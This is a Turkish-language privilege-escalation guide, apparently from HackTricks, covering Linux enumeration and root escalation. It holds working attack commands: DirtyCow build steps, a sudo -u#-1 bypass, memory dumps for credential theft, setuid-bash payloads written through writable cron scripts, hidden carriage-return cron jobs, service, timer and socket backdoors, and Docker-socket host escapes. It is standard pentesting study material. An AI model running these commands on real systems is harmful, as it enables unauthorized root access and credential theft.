# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Sistem Bilgisi

### İşletim Sistemi bilgisi

Çalışan işletim sistemi hakkında bilgi edinmeye başlayalım
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Eğer **`PATH` değişkeninin içindeki herhangi bir klasörde yazma izniniz varsa** bazı kütüphaneleri veya ikili dosyaları ele geçirebilirsiniz:
```bash
echo $PATH
```
### Env bilgisi

Ortam değişkenlerinde ilginç bilgiler, parolalar veya API anahtarları var mı?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kernel sürümünü kontrol edin ve ayrıcalıkları yükseltmek için kullanılabilecek bir exploit olup olmadığını kontrol edin.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Burada iyi bir vulnerable kernel listesi ve bazı zaten **compiled exploits** bulabilirsiniz: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) ve [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Diğer bazı **compiled exploits** bulabileceğiniz siteler: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Bu siteden tüm vulnerable kernel sürümlerini çıkarmak için şunu yapabilirsiniz:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Kernel exploits aramakta yardımcı olabilecek araçlar:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim üzerinde çalıştırın, yalnızca kernel 2.x için exploitsleri kontrol eder)

Her zaman **kernel sürümünü Google'da arayın**, belki kernel sürümünüz bazı kernel exploitlerinde belirtilmiştir ve böylece bu exploit'in geçerli olduğundan emin olursunuz.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo sürümü

Güvenlik açığı bulunan sudo sürümlerine dayanarak:
```bash
searchsploit sudo
```
Bu grep ile sudo sürümünün savunmasız olup olmadığını kontrol edebilirsiniz.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Kaynak: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg imza doğrulaması başarısız

Bu vuln'ün nasıl istismar edilebileceğine dair bir **örnek** için **smasher2 box of HTB**'ye bakın.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Daha fazla sistem keşfi
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Olası savunmaları listeleyin

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Eğer bir docker container içindeyseniz, ondan kaçmayı deneyebilirsiniz:


{{#ref}}
docker-security/
{{#endref}}

## Sürücüler

Nelerin **mount (bağlı) ve unmount (bağlı olmayan)** olduğunu, nerede ve neden olduğunu kontrol edin. Eğer herhangi bir şey unmount ise, onu mount etmeyi deneyebilir ve gizli bilgileri kontrol edebilirsiniz.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Faydalı yazılımlar

Kullanışlı ikili dosyaları listeleyin
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Ayrıca, **herhangi bir derleyicinin kurulu olup olmadığını** kontrol edin. Bu, bazı kernel exploit'leri kullanmanız gerekirse faydalıdır çünkü genellikle exploit'i kullanacağınız makinede (veya benzer bir makinede) derlemeniz önerilir.
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Zafiyetli Yazılımlar Yüklü

Yüklü paketlerin ve servislerin **sürümünü** kontrol edin. Belki eski bir Nagios sürümü (örneğin) vardır; bu kötüye kullanılabilir ve escalating privileges elde etmek için kullanılabilir…\  
Daha şüpheli görünen yüklü yazılımların sürümünü elle kontrol etmeniz önerilir.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _Bu komutların çoğunlukla yararsız olacak çok fazla bilgi göstereceğini unutmayın; bu nedenle kurulu herhangi bir yazılım sürümünün bilinen exploits'e karşı zafiyetli olup olmadığını kontrol edecek OpenVAS veya benzeri uygulamaların kullanılması önerilir_

## İşlemler

Çalıştırılan **hangi işlemlere** bakın ve herhangi bir işlemin **gereğinden fazla ayrıcalığa sahip olup olmadığını** kontrol edin (belki tomcat root tarafından mı çalıştırılıyor?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas**, sürecin komut satırındaki `--inspect` parametresini kontrol ederek bunları tespit eder.\
Ayrıca süreçlerin ikili dosyaları üzerindeki ayrıcalıklarınızı kontrol edin; birini üzerine yazabiliyor olabilirsiniz.

### Process monitoring

Süreçleri izlemek için [**pspy**](https://github.com/DominicBreuker/pspy) gibi araçları kullanabilirsiniz. Bu, sıkça çalıştırılan veya belirli gereksinimler karşılandığında yürütülen zafiyetli süreçleri tespit etmek için çok faydalı olabilir.

### Process memory

Bazı sunucu servisleri **kimlik bilgilerini bellekte açık metin olarak saklar**.\
Normalde başka kullanıcılara ait süreçlerin belleğini okumak için **root privileges** gerekir; bu nedenle bu genellikle zaten root olduğunuzda ve daha fazla kimlik bilgisi keşfetmek istediğinizde daha faydalıdır.\
Ancak unutmayın ki **normal bir kullanıcı olarak sahip olduğunuz süreçlerin belleğini okuyabilirsiniz**.

> [!WARNING]
> Günümüzde çoğu makine varsayılan olarak **ptrace'e izin vermez**, bu da ayrıcalıksız kullanıcınıza ait diğer süreçlerin dump'ını alamayacağınız anlamına gelir.
>
> _**/proc/sys/kernel/yama/ptrace_scope**_ dosyası ptrace erişilebilirliğini kontrol eder:
>
> - **kernel.yama.ptrace_scope = 0**: aynı uid'ye sahip oldukları sürece tüm süreçler debug edilebilir. Bu, ptrace'in klasik çalışma şeklidir.
> - **kernel.yama.ptrace_scope = 1**: sadece bir parent process debug edilebilir.
> - **kernel.yama.ptrace_scope = 2**: Sadece admin ptrace kullanabilir, çünkü CAP_SYS_PTRACE yetkisi gereklidir.
> - **kernel.yama.ptrace_scope = 3**: Hiçbir süreç ptrace ile izlenemez. Bir kez ayarlandığında, ptrace'i tekrar etkinleştirmek için reboot gerekir.

#### GDB

Örneğin bir FTP servisinin belleğine erişiminiz varsa Heap'i alıp içindeki kimlik bilgilerini arayabilirsiniz.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Betik
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Belirli bir işlem kimliği (PID) için, **maps bir işlemin sanal adres uzayında belleğin nasıl eşlendiğini gösterir**; ayrıca her eşlenen bölgenin **izinlerini gösterir**. **mem** pseudo dosyası **işlemin belleğinin kendisini açığa çıkarır**. **maps** dosyasından hangi **bellek bölgelerinin okunabilir** olduğunu ve bunların offsetlerini biliriz. Bu bilgiyi **mem** dosyasında seek yapıp tüm okunabilir bölgeleri dump ederek bir dosyaya aktarmak için kullanırız.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` sistemin **fiziksel** belleğine erişim sağlar, sanal belleğe değil. The kernel's virtual address space can be accessed using /dev/kmem.\
Genellikle, `/dev/mem` yalnızca **root** ve **kmem** grubundan okunabilir.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump için linux

ProcDump, Windows için Sysinternals araç paketindeki klasik ProcDump aracının Linux için yeniden tasarlanmış hâlidir. Şuradan edinebilirsiniz: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Araçlar

Bir process belleğini dumplamak için şunları kullanabilirsiniz:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Kök gereksinimlerini manuel olarak kaldırabilir ve size ait process'i dumplayabilirsiniz
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root gereklidir)

### Credentials from Process Memory

#### Manuel örnek

If you find that the authenticator process is running:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Bir process'i dump edebilir (farklı yolları bulmak için önceki bölümlere bakın: dump the memory of a process) ve memory içinde credentials arayabilirsiniz:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Araç [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) bellekten ve bazı **iyi bilinen dosyalardan** **düz metin kimlik bilgilerini çalacaktır**. Doğru çalışması için root ayrıcalıkları gerektirir.

| Özellik                                           | İşlem Adı            |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Arama Regexleri/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zamanlanmış/Cron işler

Herhangi bir zamanlanmış işin güvenlik açığı olup olmadığını kontrol edin. Belki root tarafından çalıştırılan bir betikten faydalanabilirsiniz (wildcard vuln? root'un kullandığı dosyaları değiştirebilir misiniz? symlinks kullanmak? root'un kullandığı dizinde belirli dosyalar oluşturmak?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron yolu

Örneğin, _/etc/crontab_ içinde PATH şu şekilde bulunabilir: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

_(Not: "user" kullanıcısının /home/user üzerinde yazma ayrıcalığı olduğunu fark edin)_

Eğer bu crontab içinde root kullanıcısı PATH'i ayarlamadan bir komut veya script çalıştırmaya çalışıyorsa. Örneğin: _\* \* \* \* root overwrite.sh_\
Sonrasında, şu şekilde root shell elde edebilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron bir script ile wildcard kullanımı (Wildcard Injection)

Eğer root tarafından çalıştırılan bir script içinde bir komut “**\***” içeriyorsa, bunu beklenmeyen şeyler (ör. privesc) yapmak için exploit edebilirsiniz. Örnek:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Eğer wildcard bir yolun önünde yer alıyorsa, örneğin** _**/some/path/\***_ **, bu kırılgan değildir (hatta** _**./\***_ **de değildir).**

Daha fazla wildcard exploitation tricks için aşağıdaki sayfayı okuyun:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}

### Cron script overwriting and symlink

Eğer root tarafından çalıştırılan **bir cron script'i değiştirebilirseniz**, çok kolay bir shell alabilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
root tarafından çalıştırılan script, **tam erişiminizin olduğu bir dizin** kullanıyorsa, belki o klasörü silmek ve **sizin kontrolünüzdeki bir script'i sunan başka bir klasöre işaret eden bir symlink klasörü oluşturmak** faydalı olabilir.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Sık cron jobs

Süreçleri, her 1, 2 veya 5 dakikada bir çalıştırılan işlemleri aramak için izleyebilirsiniz. Belki bundan faydalanıp escalate privileges yapabilirsiniz.

Örneğin, **1 dakika boyunca her 0.1s'de bir izle**, **en az çalıştırılan komutlara göre sırala** ve en çok çalıştırılan komutları silmek için şöyle yapabilirsiniz:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Ayrıca kullanabilirsiniz** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (bu, başlayan her süreci izleyecek ve listeleyecektir).

### Görünmez cron jobs

Bir yorumdan sonra yeni satır karakteri olmadan bir carriage return koyarak bir cronjob oluşturmak mümkündür ve cronjob çalışacaktır. Örnek (carriage return karakterine dikkat):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Servisler

### Yazılabilir _.service_ dosyaları

Herhangi bir `.service` dosyasına yazıp yazamayacağınızı kontrol edin; yazabiliyorsanız, onu **değiştirebilirsiniz** böylece servisin **başlatıldığında**, **yeniden başlatıldığında** veya **durdurulduğunda** sizin **backdoor**'unuzu **çalıştırmasını** sağlayabilirsiniz (belki makinenin yeniden başlatılmasını beklemeniz gerekebilir).\
Örneğin .service dosyasının içine backdoor'unuzu **`ExecStart=/tmp/script.sh`** ile oluşturun

### Yazılabilir servis ikili dosyaları

Aklınızda bulundurun ki, eğer **servisler tarafından çalıştırılan ikili dosyalar üzerinde yazma izniniz** varsa, onları backdoor'lar için değiştirebilir ve servisler yeniden çalıştırıldığında backdoor'ların çalıştırılmasını sağlayabilirsiniz.

### systemd PATH - Göreli Yollar

**systemd** tarafından kullanılan PATH'i şu komutla görebilirsiniz:
```bash
systemctl show-environment
```
Eğer yolun herhangi bir klasörüne **yazabiliyorsanız** **escalate privileges** elde edebilirsiniz. Servis yapılandırma dosyalarında kullanılan **göreli yollar** gibi öğeleri aramanız gerekir:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Sonra, yazma izniniz olan systemd PATH klasörünün içine **executable** ile **same name as the relative path binary** olacak şekilde bir dosya oluşturun; servis savunmasız eylemi (**Start**, **Stop**, **Reload**) gerçekleştirmesi istendiğinde, **backdoor will be executed**. (Ayrıcalıksız kullanıcılar genellikle servisleri başlatıp/durduramazlar ama `sudo -l` kullanıp kullanamadığınızı kontrol edin).

**Hizmetler hakkında daha fazla bilgi için `man systemd.service` kullanın.**

## **Zamanlayıcılar**

**Zamanlayıcılar** systemd unit dosyalarıdır; isimleri `**.timer**` ile biter ve `**.service**` dosyalarını veya olayları kontrol eder. **Zamanlayıcılar**, takvim tabanlı zaman olayları ve monotonik zaman olaylarını yerleşik olarak destekledikleri ve asenkron şekilde çalıştırılabildikleri için cron'un bir alternatifi olarak kullanılabilir.

Tüm zamanlayıcıları şu komutla listeleyebilirsiniz:
```bash
systemctl list-timers --all
```
### Writable timers

Eğer bir timer'ı değiştirebilirseniz, systemd.unit içindeki mevcut birimleri (örn. `.service` veya `.target`) çalıştırmasını sağlayabilirsiniz.
```bash
Unit=backdoor.service
```
> Bu timer sona erdiğinde etkinleştirilecek unit. Argüman, son eki ".timer" olmayan bir unit adıdır. Belirtilmezse, bu değer varsayılan olarak timer unit ile aynı ada sahip bir service'e ayarlanır; tek fark son ektir. (Yukarıya bakın.) Etkinleştirilen unit adı ile timer unit adı, yalnızca son ek dışında aynı olacak şekilde adlandırılmaları önerilir.

Bu izni kötüye kullanmak için şunlara ihtiyacınız olur:

- Bir systemd unit (ör. `.service`) bulun; bu unit **yazılabilir bir binary çalıştırıyor**.
- **relative path** çalıştıran ve **systemd PATH** üzerinde o executable'ı taklit etmek için **yazma ayrıcalıklarına** sahip olduğunuz bir systemd unit bulun.

**Timer'lar hakkında daha fazla bilgi için `man systemd.timer`'a bakın.**

### **Timer'ı Etkinleştirme**

Bir timer'ı etkinleştirmek için root ayrıcalıklarına sahip olmanız ve şu komutu çalıştırmanız gerekir:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Not: **timer**, ona işaret eden bir symlink oluşturularak `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` yolunda **etkinleştirilir**

## Sockets

Unix Domain Sockets (UDS), istemci-sunucu modellerinde aynı veya farklı makineler arasında **süreçler arası iletişim** sağlar. Bilgisayarlar arası iletişim için standart Unix descriptor dosyalarını kullanır ve `.socket` dosyalarıyla yapılandırılır.

Sockets `.socket` dosyaları kullanılarak yapılandırılabilir.

**Learn more about sockets with `man systemd.socket`.** Bu dosyanın içinde, yapılandırılabilecek birkaç ilginç parametre vardır:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Bu seçenekler farklıdır, ancak özet olarak socket'in nerede dinleyeceğini **belirtmek** için kullanılır (AF_UNIX socket dosyasının yolu, dinlenecek IPv4/6 ve/veya port numarası, vb.)
- `Accept`: Boolean bir argüman alır. Eğer **true** ise, **her gelen bağlantı için bir service instance başlatılır** ve sadece bağlantı socket'i ona iletilir. Eğer **false** ise, tüm dinleme soketleri başlatılan service unit'a **aktarılan** nesneler olur ve tüm bağlantılar için yalnızca bir service unit başlatılır. Bu değer, tek bir service unit'un tüm gelen trafiği koşulsuz olarak işlediği datagram soketleri ve FIFOs için yoksayılır. **Defaults to false**. Performans nedeniyle, yeni daemon'ların yalnızca `Accept=no` için uygun olacak şekilde yazılması tavsiye edilir.
- `ExecStartPre`, `ExecStartPost`: Bir veya daha fazla komut satırı alır; bu komutlar sırasıyla dinleme **sockets**/FIFOs **oluşturulmadan önce** veya **oluşturulduktan sonra** yürütülür. Komut satırının ilk token'i mutlak bir dosya adı olmalı, ardından süreç için argümanlar gelir.
- `ExecStopPre`, `ExecStopPost`: Dinleme **sockets**/FIFOs **kapatılmadan önce** veya **kapatıldıktan sonra** sırasıyla yürütülen ek **komutlar**.
- `Service`: Gelen trafik üzerine **aktif edilecek** **service** unit adını belirtir. Bu ayar sadece `Accept=no` olan sockets için izin verilir. Varsayılan olarak socket ile aynı adı taşıyan (sonek değiştirilmiş) service'i işaret eder. Çoğu durumda bu seçeneği kullanmak gerekli değildir.

### Writable .socket files

Eğer yazılabilir bir `.socket` dosyası bulursanız, `[Socket]` bölümünün başına `ExecStartPre=/home/kali/sys/backdoor` gibi bir satır **ekleyebilirsiniz** ve backdoor socket oluşturulmadan önce çalıştırılacaktır. Bu nedenle, **muhtemelen makinenin yeniden başlatılmasını beklemeniz gerekecektir.**\
_Sistemin bu socket dosyası yapılandırmasını kullanıyor olması gerektiğini unutmayın; aksi takdirde backdoor çalıştırılmaz_

### Writable sockets

Eğer herhangi bir yazılabilir socket tespit ederseniz (_burada artık yapılandırma `.socket` dosyalarından değil Unix Sockets'ten bahsediyoruz_), o socket ile **iletişim kurabilir** ve belki bir açığı istismar edebilirsiniz.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Ham bağlantı
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Unutmayın ki bazı **sockets listening for HTTP** istekleri olabilir (_.socket files'tan değil, unix sockets olarak davranan dosyalardan bahsediyorum_). Bunu şu komutla kontrol edebilirsiniz:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Eğer socket **HTTP isteğine yanıt veriyorsa**, onunla **iletişim kurabilir** ve belki bazı **zafiyetleri istismar edebilirsiniz**.

### Yazılabilir Docker Socket

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. By default, it's writable by the `root` user and members of the `docker` group. Possessing write access to this socket can lead to privilege escalation. Here's a breakdown of how this can be done and alternative methods if the Docker CLI isn't available.

#### **Docker CLI ile Privilege Escalation**

Docker socket'e yazma erişiminiz varsa, aşağıdaki komutları kullanarak privilege escalation gerçekleştirebilirsiniz:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Bu komutlar, host'un dosya sistemine root düzeyinde erişime sahip bir container çalıştırmanızı sağlar.

#### **Docker API'yi Doğrudan Kullanma**

Docker CLI mevcut olmadığında, Docker socket yine de Docker API ve `curl` komutları kullanılarak manipüle edilebilir.

1.  **List Docker Images:** Kullanılabilir images listesini alın.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** host sisteminin root dizinini mount eden bir container oluşturmak için bir istek gönderin.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Yeni oluşturulan container'ı başlatın:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Container'a Bağlanma:** `socat` kullanarak container ile bağlantı kurun; bu sayede içinde komut çalıştırabilirsiniz.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` bağlantısını kurduktan sonra, host'un dosya sistemine root düzeyinde erişimle doğrudan container içinde komut çalıştırabilirsiniz.

### Diğerleri

Docker socket üzerinde yazma izniniz varsa çünkü **`docker` grubunun içindeyseniz** [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Eğer [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

docker'dan çıkmak veya onu kötüye kullanarak ayrıcalık yükseltmek için daha fazla yol için bakın:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Eğer **`ctr`** komutunu kullanabildiğinizi görürseniz, aşağıdaki sayfayı okuyun çünkü **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Eğer **`runc`** komutunu kullanabildiğinizi görürseniz, aşağıdaki sayfayı okuyun çünkü **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus, uygulamaların verimli şekilde etkileşimde bulunup veri paylaşmasını sağlayan gelişmiş bir inter-Process Communication (IPC) sistemidir. Modern Linux sistemi düşünülerek tasarlanmış olup, farklı türde uygulama iletişimi için sağlam bir çerçeve sunar.

Sistem esnektir; işlemeler arası veri alışverişini geliştiren temel IPC'yi destekler, bu **enhanced UNIX domain sockets**'i anımsatır. Ayrıca olayların veya sinyallerin yayınlanmasına yardımcı olur ve sistem bileşenleri arasında sorunsuz entegrasyonu teşvik eder. Örneğin, bir Bluetooth daemon'undan gelen gelen arama bildirimi, bir müzik çalarını sessize almasını tetikleyebilir; böylece kullanıcı deneyimi iyileşir. Ek olarak, D-Bus bir remote object system destekler; bu, uygulamalar arasında servis taleplerini ve metod çağrılarını basitleştirerek geleneksel olarak karmaşık olan süreçleri düzene sokar.

D-Bus, eşleşen politika kurallarının kümülatif etkisine göre mesaj izinlerini (metod çağrıları, sinyal yayımı, vb.) yöneten bir **allow/deny model** üzerinde çalışır. Bu politikalar bus ile etkileşimleri belirler ve bu izinlerin suiistimali yoluyla privilege escalation'a izin verebilir.

Bu tür bir politika örneği `/etc/dbus-1/system.d/wpa_supplicant.conf` içinde verilmiştir; root kullanıcısına `fi.w1.wpa_supplicant1` üzerinde sahip olma, ona gönderme ve ondan mesaj alma izinlerini detaylandırır.

Kullanıcı veya grup belirtilmeyen politikalar evrensel olarak uygulanır; "default" bağlam politikaları ise diğer özel politikalar tarafından kapsanmayan herkese uygulanır.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**D-Bus iletişimini burada enumerate ve exploit etmeyi öğrenin:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Ağ**

Ağı enumerate etmek ve makinenin konumunu tespit etmek her zaman ilginçtir.

### Genel enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Açık portlar

